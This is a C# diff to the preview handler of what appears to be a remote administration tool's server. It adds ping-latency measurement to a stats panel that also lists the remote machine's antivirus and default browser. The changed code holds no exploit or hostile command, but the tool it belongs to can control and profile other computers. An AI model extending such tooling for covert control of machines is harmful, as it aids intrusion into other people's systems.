@@ -32,12 +32,39 @@ namespace Pulsar.Server.Messages
         /// </summary>
         private readonly object _sizeLock = new object();
 
-        public PreviewHandler(Client client, PictureBox box, ListView importantStatsView) : base(true)
+        private int _lastPingMs = -1;
+        private GetPreviewResponse _lastPreviewResponse;
+        
+        /// <summary>
+        /// The ping handler for measuring network latency separately from preview requests.
+        /// </summary>
+        private readonly PingHandler _pingHandler;public PreviewHandler(Client client, PictureBox box, ListView importantStatsView) : base(true)
         {
             _box = box;
             _client = client;
             LocalResolution = box.Size;
             _verticleStatsTable = importantStatsView;
+            _pingHandler = new PingHandler(client);
+            _pingHandler.ProgressChanged += OnPingReceived;
+            MessageHandler.Register(_pingHandler);
+            try
+            {
+                _pingHandler.SendPing();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error sending initial ping: {ex.Message}");
+            }
+        }
+        
+        /// <summary>
+        /// Called when a ping response is received.
+        /// </summary>
+        /// <param name="sender">The ping handler.</param>
+        /// <param name="pingMs">The ping time in milliseconds.</param>
+        private void OnPingReceived(object sender, int pingMs)
+        {
+            SetLastPing(pingMs);
         }
 
         /// <summary>
@@ -125,11 +152,34 @@ namespace Pulsar.Server.Messages
                 }
             }
         }
-
+        
+        public void SetLastPing(int ms)
+        {
+            _lastPingMs = ms;
+            if (_verticleStatsTable != null && _verticleStatsTable.IsHandleCreated && _lastPreviewResponse != null)
+            {
+                if (_verticleStatsTable.InvokeRequired)
+                {
+                    _verticleStatsTable.Invoke(new MethodInvoker(() => UpdateStats(_lastPreviewResponse)));
+                }
+                else
+                {
+                    UpdateStats(_lastPreviewResponse);
+                }
+            }
+        }
+        
         private void UpdateStats(GetPreviewResponse message)
         {
             try
             {
+                if (message == null)
+                {
+                    return;
+                }
+
+                _lastPreviewResponse = message;
+
                 // Check if the ListView has been initialized and has columns
                 if (_verticleStatsTable.Columns.Count < 2)
                 {
@@ -175,9 +225,13 @@ namespace Pulsar.Server.Messages
                 antivirusItem.SubItems.Add(message.AV);
                 _verticleStatsTable.Items.Add(antivirusItem);
 
-                var mainBrowserItem = new ListViewItem("Main Browser");
+                var mainBrowserItem = new ListViewItem("Default Browser");
                 mainBrowserItem.SubItems.Add(message.MainBrowser);
                 _verticleStatsTable.Items.Add(mainBrowserItem);
+
+                var pingItem = new ListViewItem("Ping");
+                pingItem.SubItems.Add(_lastPingMs >= 0 ? _lastPingMs + " ms" : "N/A");
+                _verticleStatsTable.Items.Add(pingItem);
             }
             catch (Exception ex)
             {
@@ -190,7 +244,7 @@ namespace Pulsar.Server.Messages
             Dispose(true);
             GC.SuppressFinalize(this);
         }
-
+        
         protected virtual void Dispose(bool disposing)
         {
             if (disposing)
@@ -199,6 +253,12 @@ namespace Pulsar.Server.Messages
                 {
                     _codec?.Dispose();
                     IsStarted = false;
+                }
+                
+                if (_pingHandler != null)
+                {
+                    MessageHandler.Unregister(_pingHandler);
+                    _pingHandler.ProgressChanged -= OnPingReceived;
                 }
             }
         }
